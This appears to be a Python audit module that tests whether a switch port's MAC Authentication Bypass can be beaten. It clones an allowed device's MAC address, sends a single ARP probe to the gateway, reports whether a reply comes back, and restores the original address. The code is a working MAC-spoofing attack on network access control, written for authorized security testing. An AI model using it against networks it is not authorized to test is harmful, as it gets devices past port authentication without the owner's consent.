"""MAB bypass: get a port authorized by presenting an allowed device's MAC address.

MAC Authentication Bypass (MAB) lets a device that cannot run 802.1X authenticate with its
MAC address, which the server checks against an allowed list. A MAC address is not a
credential. This audit clones an allowed MAC address on the attacker's interface, probes
the gateway with it, and reports whether the port forwards the probe, then restores the
original address.

The probe is an ARP request for the gateway, sent with the allowed MAC as the source and
with the sender address 0.0.0.0, so it needs no IP configuration on the attacker. A reply
addressed to the allowed MAC means the port accepted that identity.

This needs root, and it changes the attacker's interface while it runs. Use a lab or a
dedicated test adapter. The original address is always restored.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import ARP, AsyncSniffer, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.common import BROADCAST_MAC, Runner, normalize_unicast_mac, read_interface_mac, run_command
from macabre.attacks.mac_cloning import set_mac_commands

PROBE_WAIT_SECONDS = 3.0


@dataclass(frozen=True)
class MabBypassConfig:
    iface: str                          # attacker interface on the port under audit
    target_mac: str                     # the allowed device's MAC address (required)
    gateway_ip: str                     # address of a host on the port's VLAN that answers ARP
    wait_seconds: float = PROBE_WAIT_SECONDS
    dry_run: bool = False

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.target_mac)
        try:
            ipaddress.IPv4Address(self.gateway_ip)
        except ValueError as exc:
            raise ValueError("Gateway address must be an IPv4 address.") from exc
        if self.wait_seconds <= 0:
            raise ValueError("Wait time must be positive.")


@dataclass
class MabBypassStats:
    original_mac: str = ""
    target_mac: str = ""
    probes: int = 0
    reply: bool = False
    status: str = ""


def probe_frame(target_mac: str, gateway_ip: str) -> Packet:
    """ARP request for the gateway, from the allowed MAC, with sender address 0.0.0.0."""
    mac = normalize_unicast_mac(target_mac)
    return (
        Ether(src=mac, dst=BROADCAST_MAC)
        / ARP(op=1, hwsrc=mac, psrc="0.0.0.0", hwdst="00:00:00:00:00:00", pdst=gateway_ip)
    )


def is_reply(packet: Packet, target_mac: str, gateway_ip: str) -> bool:
    """True for the gateway's ARP reply addressed to the allowed MAC."""
    if not packet.haslayer(ARP):
        return False
    arp = packet[ARP]
    return arp.op == 2 and arp.psrc == gateway_ip and arp.hwdst == normalize_unicast_mac(target_mac)


def run_mab_bypass(
    config: MabBypassConfig,
    stop_event: threading.Event,
    on_progress: Callable[[MabBypassStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
    sniffer_factory: Callable[..., Any] = AsyncSniffer,
) -> MabBypassStats:
    """Clone the allowed MAC, probe the gateway once, and restore the original MAC."""
    run = run or run_command
    send = send or sendp
    target = normalize_unicast_mac(config.target_mac)

    if config.dry_run:
        stats = MabBypassStats(
            target_mac=target,
            status=(
                f"Dry run: would set {config.iface} to {target}, probe {config.gateway_ip}, and restore "
                f"the original MAC. Nothing changed."
            ),
        )
        on_progress(replace(stats))
        return stats

    original = read_interface_mac(config.iface, run)
    stats = MabBypassStats(original_mac=original, target_mac=target)
    lock = threading.Lock()
    received: list[bool] = []

    def on_packet(packet: Packet) -> None:
        if is_reply(packet, target, config.gateway_ip):
            with lock:
                received.append(True)

    try:
        for command in set_mac_commands(config.iface, target):
            run(command)
        sniffer = sniffer_factory(iface=config.iface, store=False, prn=on_packet)
        sniffer.start()
        try:
            send(probe_frame(target, config.gateway_ip), iface=config.iface, verbose=False)
            stats.probes = 1
            stop_event.wait(config.wait_seconds)
        finally:
            sniffer.stop()
        with lock:
            stats.reply = bool(received)
        stats.status = (
            f"The port forwarded the probe with the allowed MAC {target}: it accepted that identity."
            if stats.reply else
            f"No reply to the probe with the allowed MAC {target}: the port did not accept that identity."
        )
        on_progress(replace(stats))
    finally:
        for command in set_mac_commands(config.iface, original):
            run(command)
    return stats
